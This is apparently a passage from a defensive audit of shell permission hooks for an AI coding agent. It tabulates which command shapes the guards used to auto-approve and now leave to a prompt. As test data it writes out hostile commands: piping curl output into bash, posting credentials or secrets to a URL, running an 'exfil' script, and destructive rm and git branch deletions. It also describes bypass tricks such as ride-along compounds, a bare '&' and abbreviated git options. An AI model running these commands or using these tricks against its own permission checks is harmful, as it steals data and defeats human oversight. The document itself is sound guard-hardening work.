| the `-C` de-quote in `hc_git_piece_parts` **removed** | 7 — Q1, Q2, Q4, Q5, Q6, Q6b, Q15 | `allow` → SILENT ×4, **`deny` → SILENT ×3** | the obvious way to close the widening is the wrong lever. A quoted `-C` then becomes an anchor that will not resolve, and `hc_resolve_repo_root` deliberately does not fall through to the payload's `cwd`, so the deny guard **exits at repository resolution** — above its jurisdiction test, above every arm — on any quoted-`-C` push, Q15's protected-branch one included |
| the same de-quote **moved** out of `hc_git_piece_parts` and into `hc_repo_dir_from_command`, so the anchor is de-quoted and the two rewrite helpers are not | 4 — Q1, Q2, Q6, Q6b | `allow` → SILENT | the attribution. The **widening** is produced by the de-quote reaching the whitelist and by nothing else, and Q4/Q5/Q15 hold their `deny`, so the paired refusal rests on the anchor leg — a different consumer of the same one-line call |
| the two quoted `-C` spellings removed from the reconstruction `case` in `git-rewrite-branch-guard.sh` | 2 — Q6, Q6b | `allow` → SILENT | that guard's acceptance of the quoted spellings is the enumeration its own comment describes. The de-quote alone does not carry it, so the two are separate obligations |

**No row of the stop-point block, no anchor control and no unquoted twin moves under any variant** — Q7 through Q14 hold their decision in all three — so the guards were live throughout and every movement above is the leg under test. The middle variant is also the only one of the three that closes the widening without cost to a refusal; it is an attribution device rather than a recommendation, because as a change it would cost Q1, Q2, Q6 and Q6b one prompt each, and those are ordinary shapes.

#### What a later change owes this section

A change to the `-C` de-quote, to either directory whitelist or to the reconstruction `case` re-runs all 16 rows **and** the sweep, and re-runs the first fault injection specifically: the `deny → SILENT` column is the one a change aimed at the widening is most likely to move without noticing. The quoted spellings are also standing rows of `allow-safe-compounds.sh`'s own REPRO block, on both its ALLOW and its NO-OUTPUT list, so a decision that moves here contradicts that block and cannot move quietly in one place only.

---

## 3. Decision changes across the port

The consolidated record of every guard decision that changed between the pre-extraction guard set this plugin was ported from and the set shipped here, so the net effect is auditable in one place.

**Who reads this and what for:** anyone deciding whether enabling this plugin is safe relative to the implementation it was ported from, and anyone auditing the extraction after the fact. It answers one question — *did the port silence a refusal that previously fired?* — and it exists because each change made during the extraction recorded its own before/after matrix in its own review document, and none of them composed with the others. Composing them by hand, per pair, is exactly what let two of this branch's own defects through. The other sections of this file are each about one mechanism; this one is about the **difference between two guard sets**, which is the thing none of them can carry.

**Outcome: no refusal was silenced by any narrowing, tightening or widening of a matcher.** Every matcher-level change moves toward refusal or is a new spelling of a capability the baseline already granted. Two conditions do take a baseline refusal to silence — and, in the commit guard's case, to an explicit `allow` — both of them properties of the port's **jurisdiction and defaults** rather than of any matcher, both recoverable by the adopter, and both measured with the control that restores the refusal. They are §3.5's `J` block and §3.6's last two rows, and the verdict in §3.7 names them. The two destinations are not the same cost: silence hands the command back to the adopter's permission profile, an `allow` suppresses that profile's prompt, and §3.5's J1c is the one row in this section that reaches the second.

**The baseline, and why the obvious reading of it is empty.** Read "before" as this plugin's own history and there is nothing to diff: every script under `plugin/hooks/` arrived in one extraction, so a history-based diff reports the whole guard set as new and no decision as changed. The comparison with a referent is:

> **Baseline** = the pre-extraction guard set this plugin was ported from, as §1.2 names it — a product-specific implementation that is **not part of this repository**. **Subject** = the guard set shipped here, at the tree this file's other sections were measured on.

That is the only baseline against which "a refusal that previously fired" means anything, and it carries §1.2's caveat in full: the baseline column below **cannot be re-taken from this repository**. Re-running it needs the pre-extraction implementation, and the round that produced these rows records its own paths and drivers in that round's notes. A later reader who assumes the history-based reading will conclude this table is incomplete; it is not, it is answering the other question.

**Method, and how a row is spelled.** §0's recipe, real `PreToolUse` payloads, the benign `rm -r-f` stand-in for destructive shapes. Two departures §0 does not cover, both forced by the baseline:

- **The two sets resolve their repository differently** — the baseline from the hook process's working directory, this plugin from the payload's `cwd` — so each side is handed a payload shape valid for it, and each side is anchored on a repository of its own. A row is therefore a **shape**, not a byte-identical string. The exception is a row that is *about* the repository — the jurisdiction and defaults blocks of §3.5 and §3.7 — where one fixture serves both columns, because neither of the two branch-judging guards tests a work root on either side and a second repository would add a confound rather than remove one.
- **The two sets resolve `<repo>`, `<app_dir>` and `<runner>` differently too.** The baseline bakes them in as literals; this plugin derives them from `harness.config.json`. Where a shape cannot be spelled on both sides at all, the row says so rather than being dropped.
- **A row names the change that moved it, not a revision.** A revision identifier stops resolving the moment this plugin leaves the repository it was extracted in; the mechanism does not.

### 3.1 Narrowed — `allow` → SILENT

Every row costs at most one permission prompt and never a wrong allow, because all four allow-only guards emit `allow` or nothing.

| # | Shape | baseline | shipped | What narrowed it |
|---|---|---|---|---|
| N1 | `echo $(rm -r-f <dir>; ls)` | allow | **SILENT** | the torn-substitution test, on the raw piece |
| N2 | `echo $(rm -r-f <dir> $(date); ls)` | allow | **SILENT** | …and its depth tracking, which a nested closed substitution defeats otherwise |
| N3 | `echo $(rm -r-f <dir>; git rm <tracked>)`, rewrite guard | allow | **SILENT** | the same test in the second piece loop |
| N4 | `git status && git branch -D <b>` | allow | **SILENT** | `hc_piece_is_never_safe`, ahead of every arm that could vouch |
| N5 | `git status && git -C <repo> branch -D <b>` | allow | **SILENT** | the same test applied to the **rewritten** form as well as the piece |
| N6 | `git branch -D <b> && rm <tracked>`, rewrite guard | allow | **SILENT** | the same test in `is_safe_prefix` |
| N7–N10 | `git status && git -C <repo> <push --all \| reset --hard \| checkout \| clean -fdx>` | allow | **SILENT** | the open `git -C <dir> *` arms replaced by `hc_git_piece_in_workspace`, which judges the **subcommand** |
| N11–N13 | `git status && <runner> --prefix <app_dir> <publish \| install <pkg> \| exec -- …>` | allow | **SILENT** | the same, in `hc_runner_piece_in_workspace` |
| N14 | `git -C <repo> push --all <remote> && git -C <repo> rm <tracked>` | allow | **SILENT** | both helpers serve the rewrite guard too |
| N15 | a `git rm` piece whose own `-C` names a repository the guard never judged | allow | **SILENT** | that arm now requires the piece's `-C` to resolve to `top` — driven with the two pieces in **opposite order** between the columns, because the baseline anchors on the **last** `-C` in a compound and this plugin on the first, so the same byte string is not the same shape to both |
| N16 | `<runner> --prefix <work_root>/<project_name>-../../../<elsewhere>/<app_dir> <sub>` | allow | **SILENT** | the literal `/../` reject; the baseline's worktree arm let a mid-pattern `*` span `/` |
| N17–N22 | six command names — interpreter, package-manager, toolchain-runner and SDK spellings that were literals in the source implementation's base prefix set and are now `commands.*` configuration — each inside a compound | allow | **SILENT** | **no fix made this one**: the port dropped those literals from the base set, and an adopter gets them back through `commands.*`. `lib/harness-config-lib.sh`'s **SAFE PREFIXES NARROW, THEY DO NOT WIDEN** paragraph is the decision; these are its measured cost |

**One shape reads the same on both sides and is worth naming, because a review document reports it as a narrowing.** `echo $(rm -r-f <dir>; rm <tracked>)` through the rewrite guard is SILENT on **both** — the baseline's piece walk never peeled a grouping paren, so its second piece kept a trailing `)` and failed the tracked-path test for an unrelated reason. The `git rm` spelling (N3) is the one that isolates the torn test. A row set that only carried the plain-`rm` spelling would report that test as changing nothing.

**One narrowing cannot be spelled on the baseline at all.** The scoped-`appDir` cost — `<runner> --prefix <app_dir> <sub>` losing its `allow` when `<app_dir>` carries a character outside the path class — is a cost of a **configured** directory, and the baseline has no configured directory to scope. §2.4's (b) measures it against this plugin's own unscoped behaviour, which is the only comparison available for it.

**The script-allowlist guard's compound rows, added after the rest of this section and measured against a different pair of trees.** These close a ride-along in `autonomous-script-allowlist-guard.sh`: it walked every token of the command, skipped each one not ending in `.sh`, and emitted an `allow` covering the **whole call** as soon as one `.sh` token resolved under `scriptsDir`. The fix judges every piece of `hc_split_command` — a script-bearing piece must also *start* with the script (or `bash`/`sh` then the script), and a piece bearing no script goes through the same tests `allow-safe-compounds.sh` applies.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N23 | `bash <scripts dir>/<wrapper>.sh && curl -s <url> \| bash` | allow | **SILENT** | the second piece is judged at all; `curl` is in no prefix set |
| N24 | `bash <scripts dir>/<wrapper>.sh && rm -r-f <repo>/<tracked>` | allow | **SILENT** | the same, and the reason a start-anchored permission `deny` never reached it |
| N25 | `bash <scripts dir>/<wrapper>.sh; curl -d @<repo>/<secret> <url>` | allow | **SILENT** | the same across a `;` rather than a `&&` |
| N26 | `bash <scripts dir>/<wrapper>.sh && git branch -D <b>` | allow | **SILENT** | `hc_piece_is_never_safe`, now reached from this guard too — N4's test in a third caller |
| N27 | `rm -r-f <scripts dir>/<wrapper>.sh`, and `curl -o <scripts dir>/<wrapper>.sh <url>` | allow | **SILENT** | the leading-words test: both name a wrapper on an impeccable path without running it |

**Which two trees these columns are, stated because they are not this section's usual pair.** The baseline this section diffs against is the pre-extraction guard set, and §3's own caveat is that its column **cannot be re-taken from this repository**. It was not re-taken for these rows. The measured pair is instead **this plugin's tree immediately before the fix and immediately after**, in one session on §0's primary fixture — which is the pair that establishes the fix does what it claims, and the only one available without the pre-extraction implementation. Read "before" in this table as that tree, not as the baseline the rows above it use.

**Six keeper controls, driven in the same two runs, hold `allow` in both columns**: the guard's four REPRO allow rows (bare absolute, behind a leading `cd <repo>`, quoted, and a sibling worktree), two allowed wrappers in one compound, and a wrapper compounded with `git status` in each order. The guard was live in both columns, and the narrowing costs no shape the corpus spells.

**The credentials guard's token, redirection and compound rows, added after the script-allowlist block and measured against the same kind of pair.** These close three defects in `allow-qa-credentials-read.sh` at once. Its refused-token scan named no shell, `env`, `xargs`, `awk` or `sed`, so a command that read the configured credentials file and handed it to one of those was `allow` — including `sed -i`, a mutation the scan's first bullet already claimed to cover. Its `allow` covered the whole Bash call while it tested only that the command *mentioned* the configured basename, so anything appended to a read rode along. And it refused a redirection only when the target was the credentials file itself, which left a copy of the cleartext file to an arbitrary path permitted. `<creds>` below is the fixture's `.claude/qa-accounts.env`, spelled absolutely unless a row says otherwise.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N28–N33 | `bash /tmp/exfil.sh <creds>`; `sh -c 'cat <creds>'`; `xargs -a <creds> echo`; `awk '{print}' <creds>`; `sed -i.bak 's/a/b/' <creds>`; `env FOO=1 cat <creds>` | allow | **SILENT** | the shells, `env`, `xargs`, `awk` and `sed` added to the refused-token scan — and, behind it, the read-command test on the piece: with the added tokens removed again these six do **not** move |
| N34–N35 | `cat <creds> \| sh`; `cat <creds> \| zsh -s` | allow | **SILENT** | the same tokens, and the only two rows that rest on the scan **alone** — `hc_split_command` never splits on a pipe, so no piece test reaches them |
| N36–N37 | `cat <creds> > /tmp/x`; `f=<creds>; cat "$f" > /tmp/x` | allow | **SILENT** | the blanket refusal of `>` / `>>` replacing the old file-targeted pattern. N37 is the spelling in which **no piece names the file at all**, so a piece-scoped rule would not have reached it |
| N38 | `grep ACCOUNT_1 <creds> 2>/dev/null` | allow | **SILENT** | the same rule's disclosed cost: one prompt from an allow-only guard, never a wrong allow |
| N39 | `sed -n 's/=.*/=<redacted>/p' <creds>` | allow | **SILENT** | the redacted-print idiom the old header protected as a deliberate non-refusal. Refused twice over — as a token and as a piece leading with no read command — and spelled nowhere in the shipped corpus, which is what made it affordable |
| N40–N41 | `cat <creds> && git push <remote> <branch>`; `cat <creds> && git commit -m x` | allow | **SILENT** | the ride-along: every piece is judged now, and a piece naming no credentials file goes through `hc_safe_prefixes`. N40 is the shape that auto-approved a push the adopter's profile keeps on `ask`, under a reason string calling the grant "Read-only inspection" |
| N42 | `find <creds> -delete` | allow | **SILENT** | a piece **naming** the file must lead with one of `CREDS_READ_COMMANDS`. `find` is a safe prefix by leading words, which is exactly why the credentials-bearing piece is not judged against that set |
| N43 | `if [ -f <creds> ]; then cat <creds>; fi` | allow | **SILENT** | control flow falls through, as it does in `allow-safe-compounds.sh` and for the same reason. The old header claimed this shape as a reason the guard existed; it now costs one prompt, and the shipped instruction corpus already directs an unattended flow to two single statements rather than an exit-code-gated block |

**Which two trees these columns are.** As with N23–N27, and for the same reason: **this plugin's tree immediately before the fix and immediately after**, in one session on §0's primary fixture, not the pre-extraction baseline §3's caveat says cannot be re-taken from this repository.

**Eight keeper controls hold `allow` in both columns**, driven in the same two runs: `cat <creds>`; `grep -E '^ACCOUNT_1_EMAIL' <creds>`; `head -n 5 <creds>`; `tail -n 2 <creds>`; `f=<creds>; grep -E '^ACCOUNT_1' "$f"` (the assignment compound the guard exists for); `cd <repo> && cat <creds>` (the path-anchored arm); `cat <creds> && git status`; and `echo "PW=$(grep ACCOUNT_1_PASSWORD <creds>)"` — the transcript print the guard's header discloses as a deliberate trade-off, which this narrowing deliberately does not take. **Five pre-existing refusals hold SILENT in both**: `cp <creds> /tmp/x`, `curl -d @<creds> <url>`, `node -e "…<creds>…"`, `echo x > <creds>` and `cat <other>.env`. The guard was live in both columns.

**Which leg produces each SILENT, by fault injection.** One leg removed at a time from the shipped guard, the whole 29-shape set re-driven each time, direction shipped → variant:

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| the added shell / `xargs` / `awk` / `sed` names removed from the scan | 2 — N34, N35 | SILENT → **allow** | the scan is load-bearing where the split does not reach and defence in depth everywhere else, which is the right way round: `hc_split_command` reads `&&`, `\|\|`, `;` and a bare `&`, so neither a pipe nor a balanced `$(…)` starts a piece and the whole-string scan is the only refusal standing over both (§2.4 (j)–(k)) |
| the redirection `case` removed | 4 — N36, N37, N38 and `echo x > <creds>` | SILENT → **allow** | the blanket rule subsumes the old file-targeted pattern rather than sitting beside it — the old pattern's own row moves too, because there is nothing else left to refuse it |
| the piece walk reduced to the old "mentions the basename" test | 4 — N40, N41, N42, N43 | SILENT → **allow** | the all-or-nothing rule alone produces the ride-along, the read-command and the control-flow rows |
| the `env` alternative removed from the scan | 0 | — | `env` is a second refusal behind the read-command test, recorded so a later reader does not credit it with a row. It carries a **narrower left boundary** than the other tokens for a measured reason: with the shared `[^[:alnum:]_]` boundary it matches the `env` in a credentials file's own `.env` suffix and silences the guard for every such adopter. Driven with `qa.credentialsPath` set to `.claude/qa-accounts.env`, `secrets/accounts-env`, `secrets/env` and `secrets/creds` in turn, the control read is `allow` in all four |

**What §1 and §2.3 owe this change, discharged.** §1.1's invariant was re-run: the §1.3 fork counts for this guard on `git status && ls` are **2 `jq`, 1 `git`, 0 `sed`, 1 `grep`, 0 `tr`, 1 `cat`, unchanged**, and still flat at 1 / 2 / 4 / 8 pieces and on the cheapest `ls` payload — the new redirection test is a `case`, which forks nothing, and the piece walk sits behind the basename match that those payloads never reach. On a payload that *does* name the file the counts **fall**, from 3 `jq` / 1 `sed` / 2 `grep` to 3 `jq` / 0 `sed` / 1 `grep`, because the old file-targeted redirect pattern was built by a `printf | sed` and matched by a second `grep`. §1.2 was re-measured paired, twice: every cell of this guard's row reproduces its published figure within the ±10% tolerance, and the credentials read itself is about 2 ms faster. §2.3's whole QA column — all fourteen conditions and the three single-guard gates — was re-driven on both trees and is **identical cell for cell**.

**The script-allowlist guard's construct-scan rows, added after every block then in this section — N1–N83 — and measured against the same kind of pair.** These close §2.4's residual (j) — the ride-along the separators do not reach. The guard now scans the whole command string for the shell's composition grammar (`$(`, a backtick, `|`, `>`, `<`, `${`) and exits silently on a match, before the repository is resolved. It scans **constructs, not binaries**: the union argument is that every command shape either splits into a piece the guard already judges or carries one of the six constructs, and a bare binary in argument position runs nothing. `<S>` is the fixture's configured `scriptsDir`, `<url>` an unroutable host. Fifteen shapes move, and the six arms are each isolated by at least one of them. **The `${` arm was later narrowed** to admit a bare `${IDENT}`: N106 below is superseded by §3.3's W19–W21, and the other five arms are untouched by that change. **The `>` arm was narrowed later still**, to the two destinations that reach no file: N102 is superseded by §3.3's W23–W24 on the same precedent, and N100, N101 and the whole `<` arm (N103–N105) are untouched by *that* change. Its rows carry **N93–N107**, the numbers free above every row already recorded, rather than continuing from the block above them: the N-sequence is a stable index, so a block takes fresh numbers wherever it is placed and no existing row renumbers.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N93–N94 | `bash <S>/<wrapper>.sh \| bash`; `… \| curl -d @- <url>` | allow | **SILENT** | the `\|` arm — §2.4's j1 and j2 |
| N95–N97 | `… $(curl -s <url>)`; `… $(rm -r-f <repo>/<tracked>)`; ``… `curl -s <url>` `` | allow | **SILENT** | the `$(` and backtick arms — j8 and j3, plus the backtick spelling neither j-row carried |
| N98–N99 | `… <(curl -s <url>)`; `… >(cat)` | allow | **SILENT** | process substitution, caught as superstrings of `<` and `>` rather than by entries of their own |
| N100–N102 | `… > /tmp/x`; `… >> /tmp/x`; `… 2>/dev/null` | allow | **SILENT** | the `>` arm. This guard ran **no** redirect check at all before — unlike `allow-qa-credentials-read.sh`, whose blanket `>` refusal predates this. **N102 is superseded**: `… 2>/dev/null` is `allow` in the shipped tree again, because the arm was later narrowed to the two destinations that reach no file (§3.3's W23–W24). **N100 and N101 are not** — a FILE destination stays refused, and the two are §3.3's WK23. One of the three commands this row shares moved, which is why one appended clause is the whole edit: the row is not split, not renumbered and not rewritten |
| N103–N105 | `… < /tmp/x`; `… <<< hello`; `… <<EOF` on one line | allow | **SILENT** | the `<` arm. The multi-line here-document was already SILENT — incidentally, from the line-by-line piece loop rather than from a check — so N105 is the spelling that isolates the arm |
| N106 | `… ${HOME}` | allow | **SILENT** | the `${` arm — **superseded**: this exact shape is `allow` in the shipped tree again, because the arm was later narrowed to the bare `${IDENT}` form (§3.3's W20). What still moves here is every other braced spelling, `${x@P}` among them (§3.3's WK15) |
| N107 | `bash <S>/a.sh \|\| bash <S>/b.sh` | allow | **SILENT** | **the cost, not a defence**: `\|\|` is a superstring of the scanned `\|`, so of the four separators the split reads, this one no longer reaches it. One prompt from an allow-only guard, never a permit. This row's trailing clause read that `&>` and `2>&1` are the same shape against the `>` arm; **that clause is superseded** for those two spellings — both are `allow` in the shipped tree (§3.3's W23–W24). The row's own subject is untouched: `\|\|` is still a superstring of the scanned `\|` and still SILENT (§3.3's WK29) |

**Which two trees these columns are** — as with N23–N43, this plugin's tree immediately before the construct scan and immediately after, driven back to back in one session on a `git init` throwaway carrying `projectName: acme-shop`, `scriptsDir: scripts`, `qa.credentialsPath: .claude/qa-accounts.env`, `phases.qa: true`. Not the pre-extraction baseline, which cannot be re-taken here.

**Eight keeper controls hold `allow` in both columns**: four single-wrapper spellings (bare absolute, relative behind a leading `cd <repo>`, relative against the payload's own cwd, and quoted), two allowed wrappers in one `&&` compound, a wrapper compounded with `git status` in each order, and a commit spelling — `bash <S>/commit-on-branch.sh --repo <repo> <path> -- "chore: …"`. A ninth control, `bash <S>/deploy.sh`, is SILENT in both. The two sibling allow-only guards were driven in the same session on the tail shapes of §2.4's (j)–(k) block and no row of either moved.

**What that keeper row does NOT establish, corrected here rather than left standing.** This block originally read those controls as showing the narrowing *costs no shape the shipped corpus spells*. It does not, and the keeper is where it fails: the commit subject was driven **sanitized of the `${…}` the corpus actually writes**, so the one control that could plausibly have cost anything was the one spelling that could not. Driven with the corpus's real spelling — `${branch}` in the statistics path and again in the subject — the same command was **SILENT**. Two claims replace the one that was here. The claim that holds is about **permits**: this scan grants nothing, so every loss it causes is one prompt and never a permit. The claim about shapes is false in two named classes — (i) prose in a wrapper's own arguments, since the `<`, `>`, backtick and `|` arms fire on a commit subject as readily as on a redirection, which is the same false-positive class this guard's refusal of any binary *by name* was chosen to avoid; and (ii) the `${…}` expansion the seven autonomous commit blocks carry. Class (i) is **accepted** — the alternative is parsing quoting. Class (ii) is **bought back**, by the narrowing recorded in §3.3's W19–W21.

**The script-allowlist guard's case-variant deny rows, added after the credentials block and measured against the same kind of pair.** `is_denied_script` compared a token's basename to each `DENY_SCRIPT_BASENAMES` entry byte for byte, while the default macOS filesystem is case-insensitive — `DEPLOY.sh` opens the file `deploy.sh` names, verified on the fixture by reading it back — so every entry had a second spelling the guard auto-allowed. The header's claim that one entry covers "a relative spelling, an absolute one and any sibling worktree", and `plugin/hooks/README.md`'s repetition of it, were false in that spelling. The fix lower-cases both sides (`LC_ALL=C tr 'A-Z' 'a-z'`; bash 3.2 has no `${var,,}`). `<S>` below is the fixture's `packages/storefront/scripts`.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N44–N46 | `bash <repo>/<S>/DEPLOY.sh`, and its `Deploy.sh` and `dEpLoY.sh` spellings | allow | **SILENT** | the deny comparison lower-cased on both sides |
| N47–N49 | the same for `AUTONOMOUS-WATCHER.sh tick`, `Restart-Watcher.sh` and `Cleanup-Merged-Worktrees.sh` — one row per outer-loop entry, because each entry carried its own second spelling | allow | **SILENT** | the same |
| N50, N51 | `cd <repo> && bash <S>/DEPLOY.sh`; the double-quoted absolute spelling | allow | **SILENT** | the same, reached through the `cd` arm and through the quoted-path normalization — the two spellings the guard's REPRO block already treats as first-class |
| N52 | `bash <repo>/<S>/typecheck.sh && bash <repo>/<S>/DEPLOY.sh` | allow | **SILENT** | the same, composed with the all-or-nothing rule: one denied piece silences a compound whose other piece is impeccable |
| N53 | `bash <work_root>/<project_name>-<branch>/<S>/DEPLOY.sh` | allow | **SILENT** | the same inside a **sibling worktree**, the third spelling the false claim named |

**Which two trees these columns are.** As with N23–N43, and for the same reason: **this plugin's tree immediately before the fix and immediately after**, in one session on §0's primary fixture, not the pre-extraction baseline §3's caveat says cannot be re-taken from this repository.

**The `.sh` suffix test is deliberately NOT case-folded, and two rows record what that costs.** `bash <repo>/<S>/deploy.SH` and `bash <repo>/<S>/typecheck.SH` are SILENT in **both** columns: the `*.sh` `case` glob is case-sensitive, so neither piece carries a script at all and both fall through. On a case-insensitive filesystem the second spelling would have run the wrapper, so a wrapper invoked as `.SH` costs one permission prompt — pre-existing, unchanged here, and never a wrong `allow`.

**Nineteen control rows hold their decision in both columns**, driven in the same two runs over one 29-row set. **Nine hold `allow`**: the guard's four REPRO allow spellings (bare absolute, behind a leading `cd`, quoted, sibling worktree), two allowed wrappers in one compound, a wrapper compounded with `git status` in each order, and `predeploy.sh` and `deploy-notes.sh` — the two basenames that *contain* a denied one, which is what shows the match stayed whole-basename rather than becoming a substring test. **Ten hold SILENT**: all four deny entries in their own lower-case spelling, `deploy.sh` inside a sibling worktree, the two `.SH`-suffix rows above, a script outside the workspace, the `<S>/*.sh` glob and a `git status` carrying no `.sh` token. The guard was live in both columns.

**Which leg produces each row, by fault injection.** One leg changed at a time in the shipped guard, the whole 29-row set re-driven each time, direction shipped → variant:

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| the lower-casing removed from both sides | 10 — N44–N53 | SILENT → **allow** | the lower-casing alone produces every row of the table, and no control row moves with them |
| one deny entry rewritten `Deploy.SH` in the constant | 0 | — | **both** sides are lower-cased, not only the incoming basename: a mixed-case entry still withholds `deploy.sh` and `DEPLOY.sh`, and still allows `typecheck.sh`. This is why the constant's note says entries are written lower-case for readability rather than for correctness |

**What §1 owes this change, discharged.** §1.3's published cells do not move: on its `git status && ls` payload this guard still forks `0 jq / 0 git / 0 sed / 0 grep / 0 tr / 1 cat`, and the same on the cheapest `ls` payload, because `is_denied_script` is reached only from a token ending in `.sh` and neither payload has one. The new cost is **two `tr` forks per `.sh` token examined** — one for the basename, one for the list — measured as `tr` 0 → 2 on a single-wrapper payload and 0 → 4 on a two-wrapper compound, with every other column unchanged. Unlike §1.3's published rows this one scales with the number of `.sh` tokens rather than with piece count. Paired wall-clock on `bash <repo>/<S>/typecheck.sh`, 40 iterations, twice: **+8% and +14%** of roughly 30 ms, and flat within ±1% on `git status && ls` in both runs. That is the whole price of the fix and it is not hidden in a published cell.

**The never-safe helper's long-option abbreviation rows, measured against the same kind of pair.** `hc_piece_is_never_safe` matched the long ref-losing options as the three literals `--delete*` / `--move*` / `--force*` and sent every other `--*` token to a no-op arm, while git's parse-options accepts **any unambiguous abbreviation** — confirmed on the fixture with git 2.50.1: `--d`, `--de`, `--del`, `--dele` and `--delet` all reach `branch 'x' not found`, `--mo`/`--mov` reach `no branch named 'x'`, and `--forc` runs. So a spelling test refused three strings and handed out the operation. The fix tests the token's body as a **prefix** of `delete`, `move` or `force` (`case delete in "$body"*`), which is the operation rather than a list of spellings. Every row below is driven in **all four guards that call the helper** — `allow-safe-compounds.sh`, `git-rewrite-branch-guard.sh`, `autonomous-script-allowlist-guard.sh` and `allow-qa-credentials-read.sh` — each inside the compound shape that guard vouches for (`git status && <piece>`, `<piece> && git rm <tracked>`, `bash <S>/typecheck.sh && <piece>`, `cat <creds> && <piece>`), and every row's decision is **identical in all four**, so one column serves for all of them. `<b>` is the fixture's spare branch.

| # | Shape | before | after | What narrowed it |
|---|---|---|---|---|
| N54–N58 | `git branch <--d \| --de \| --del \| --dele \| --delet> <b>` | allow | **SILENT** | the long arm reading a prefix of `delete` rather than the literal `--delete` |
| N59, N60 | `git branch <--mo \| --mov> <b> <b2>` | allow | **SILENT** | the same for `move` |
| N61 | `git branch --forc <b> HEAD` | allow | **SILENT** | the same for `force` |
| N62–N65 | `git branch <--m \| --f \| --fo \| --for> …` | allow | **SILENT** | the same, on the stubs git itself rejects as ambiguous — refused here at no cost, since git runs nothing for them either |
| N66 | `git branch --d"e" <b>` | allow | **SILENT** | the abbreviation composed with the quote removal the helper already did: an abbreviation split across a quote is still an abbreviation |
| N67 | `git branch -q --dele <b>` | allow | **SILENT** | the same with the flag out of leading position, which is what a start-anchored profile `deny` cannot reach either |
| N68 | `git -C <repo> branch --dele <b>` | allow | **SILENT** | the same on the form `hc_git_piece_parts` strips global options from — N5's shape in the new spelling class |

**Which two trees these columns are.** As with N23–N53, and for the same reason: **this plugin's tree immediately before this fix and immediately after**, in one session on §0's primary fixture, not the pre-extraction baseline §3's caveat says cannot be re-taken from this repository.

**Thirty-six control and keeper rows hold their decision in both columns**, driven in the same two runs over one 51-row set, 204 decisions per tree. **Eight hold SILENT**: the three full spellings `--delete` / `--move` / `--force`, the single-dash class `-D`, `-m`, `-C`, its quoted spelling `"-D"`, and a `$`-bearing piece. **Twenty-eight hold `allow`**, and they are what shows the prefix test did not widen into the granted set: the bare listing form, `--list`, `--show-current`, `-a`, `-r`, `-v`, `--merged`, `--no-merged`, `--contains`, `--sort=`, `--format=%(refname)`, `--copy`, plain creation; the granted options' **own** abbreviations `--li`, `--me`, `--mer`, `--cont`, `--form=`, `--so=` — none of which is a prefix of a ref-losing option, `merged` and `format` diverging from `move` and `force` at their second and fourth letter; the `--` end-of-options marker alone and after `--list`; and seven benign commands whose words merely resemble the guarded options — `echo --delete <b>`, `grep -- --delete <tracked>`, `git log --format=%h`, `git diff --stat`, `git status --short`, `git config --get <key>`, `git remote -v`.

**Which leg produces each row, by fault injection.** One leg changed at a time in the shipped library, the whole 51-row set re-driven each time in all four guards, direction shipped → variant:

| Variant | rows that move | direction | what it establishes |
|---|---|---|---|
| the long arm reverted to the three literals `--delete*\|--move*\|--force*` | 15 — N54–N68 | SILENT → **allow** | the prefix test alone produces every row of the table, and no control or keeper row moves with them |
| the empty-body guard removed, so `--` reads as a zero-length abbreviation | 2 — the two `--` end-of-options keepers | allow → **SILENT** | that guard is what keeps a bare `--` from matching every option; its removal costs a prompt on a legitimate shape and never a wrong `allow`, which is the direction this whole helper fails in |

**What §1 owes this change, discharged.** The arm is a `case` plus one parameter expansion and forks nothing: §1.3's published cell for `allow-safe-compounds.sh` on `git status && ls` reproduces exactly — **3 `jq`, 1 `git`, 0 `sed`, 0 `grep`, 0 `tr`, 3 `cat`** — and is unchanged on an allowed `git status && git branch --list`. On a payload the fix now refuses, `jq` **falls** 3 → 2, because the guard stops before reading the last configuration key. Paired wall clock, 20 iterations per cell, twice: **+0.1% / +0.4%** on `git status && ls` and **+0.9% / +0.7%** on `git status && git branch --list`, of roughly 43 ms — flat within the ±10% tolerance §0 sets.

**The bare-`&` separator's rows, added after every block above and measured against the same kind of pair.** `hc_split_command` treated only `&&`, `||`, `;` and a newline as separators. A bare `&` is a statement separator in every POSIX shell, not a modifier, so the piece was judged on the statement *before* the `&` and the statement after it was never judged at all — `git status && ls & rm -r-f <dir>` was two pieces, `git status` and `ls & rm -r-f <dir>`, the second matching the `ls` prefix by leading words. Every allow-only guard then vouched for the whole line, `git branch -D` included, which is precisely what `hc_piece_is_never_safe` exists to make unreachable from any of them. The fix adds the bare `&` to the separator set, resolving the tie at a shared offset in favour of the longer `&&`, and steps over the three spellings in which `&` is not that operator: `&&`, `&>` / `&>>`, and `>&` / `<&`. It lands in the shared splitter, so it closes every calling guard at once — and every calling guard was driven, not just the three the finding named. `<S>` is the fixture's configured `scriptsDir`, `<creds>` its `qa.credentialsPath`, `<victim>` a spare branch.

| # | Shape | before | after | Guard | What narrowed it |
|---|---|---|---|---|---|
| N69 | `git status && ls & rm -r-f <tracked>` | allow | **SILENT** | compounds | the bare `&` ends the piece, so the statement behind it is judged |
| N70 | `git status && ls & git branch -D <victim>` | allow | **SILENT** | compounds | the same, reaching `hc_piece_is_never_safe`, whose header says no arm of an allow-only guard may grant that form |
| N71 | `ls & curl <url> -d @<creds> && pwd` | allow | **SILENT** | compounds | the same, on the exfiltration shape — an unjudged `curl` matched no prefix once it was its own piece |
| N72 | `git status && ls & bash /tmp/<script>.sh` | allow | **SILENT** | compounds | the same, on an interpreter invocation |
| N73 | `git status && ls \|& rm -r-f <dir>` | allow | **SILENT** | compounds | `\|&`'s `&` separates too; the pipe itself still does not, so the left operand stays one piece |
| N74 | `git status && echo $(ls & rm -r-f <dir>)` | allow | **SILENT** | compounds | the new separator inside `$(…)` tears the substitution, and `hc_torn_substitution` refuses the fragment |
| N75 | `git status && echo "a & b"` | allow | **SILENT** | compounds | **the cost row**, not a defence: the split reads no quoting, so a separator byte inside a quoted argument costs one prompt — §2.4's residual `h`, and the same price `"a ; b"` already paid |
| N76 | `git status & rm -r-f <repo>/scripts && rm <tracked>` | allow | **SILENT** | rewrite | the finding's fourth shape: the `rm -r-f` rode along behind `git status` on one piece |
